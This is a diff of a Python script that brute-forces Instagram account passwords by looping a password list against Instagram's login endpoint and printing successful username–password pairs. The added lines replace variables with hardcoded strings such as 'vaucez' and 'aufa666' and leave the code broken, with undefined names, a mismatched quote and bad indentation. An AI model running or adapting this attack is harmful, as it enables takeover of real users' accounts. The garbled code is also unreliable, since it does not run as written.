@@ -5,26 +5,26 @@ import os
 
 filename = 'pass.txt'
 if os.path.isfile(filename):
-	with open(filename) as f:
+	with open (instagram) as f:
 	    passwords = f.read().splitlines()
 	    if (len(passwords) > 0):
-	    	print ('%s Passwords loads successfully' % len(passwords))
+	    	print ('%s Passwords loads successfully' % len('aufa666'))
 else:
-	print ('Please create passwords file (pass.txt)')
+	print ('aufa666')
 	exit()
 
 
 
 
 def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % 'vaucez') 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+       return {'vaucez':vaucez,'id':fUserID}
 
 
 def Login(username,password):
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'vaucez':username, 'aufa666':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -68,7 +68,7 @@ def Login(username,password):
 
 
 def follow(sess, username):
-	username = userExists(username)
+	username = userExists('vaucez')
 	if (username == False):
 		return	
 	else:
@@ -77,21 +77,21 @@ def follow(sess, username):
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
+username = str(input('vaucez': '))
+username = userExists('vaucez')
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	username = username['vaucez']
 
 
 
-delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
+delayLoop = int(input('aufa666 ')) 
 
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(vaucez,aufa666)
 	if (sess):
 		print ('Login success %s' % [username,password])
 
